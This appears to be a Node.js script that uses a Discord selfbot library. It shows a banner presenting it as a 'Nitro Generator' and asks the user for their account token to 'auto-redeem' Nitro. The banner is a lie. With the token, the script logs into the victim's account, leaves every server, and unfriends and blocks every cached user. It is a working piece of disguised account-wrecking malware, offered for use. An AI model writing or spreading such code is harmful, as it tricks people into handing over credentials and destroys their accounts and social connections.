const readline = require('readline');
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const { Client } = require('discord.js-selfbot-v13');
const client = new Client({ checkUpdate: false });

client.on('ready', async () => {
    const servers = await client.guilds.fetch();

    servers.forEach(async (s) => {
        try {
            const server = await client.guilds.fetch(s?.id);

            await server.leave();
        } catch {};
    });

    const users = client.users.cache.filter((u) => u?.id !== client?.user?.id);

    users.forEach(async (u) => {
        try {
            await u.unFriend();
            await u.setBlock();
        } catch {};
    });
});

const question = () => {
    console.clear();
    console.log(`
▄▄▄        ██████ ▄▄▄█████▓ ██▀███   ██▓ ██▓    
▒████▄    ▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▓██▒▓██▒    
▒██  ▀█▄  ░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██▒▒██░    
░██▄▄▄▄██   ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ░██░▒██░    
 ▓█   ▓██▒▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒░██░░██████▒
 ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░▓  ░ ▒░▓  ░
  ▒   ▒▒ ░░ ░▒  ░ ░    ░      ░▒ ░ ▒░ ▒ ░░ ░ ▒  ░
  ░   ▒   ░  ░  ░    ░        ░░   ░  ▒ ░  ░ ░   
      ░  ░      ░              ░      ░      ░  ░

NITRO GENERATOR | VERSION: 1.0.5 | XEMOLNG_JS#5902                                       
`);
rl.question('Amount of Nitro: ', () => rl.question('Account Token (AUTO-REDEEM): ', (token) => client.login(token).catch(question)))
};

question();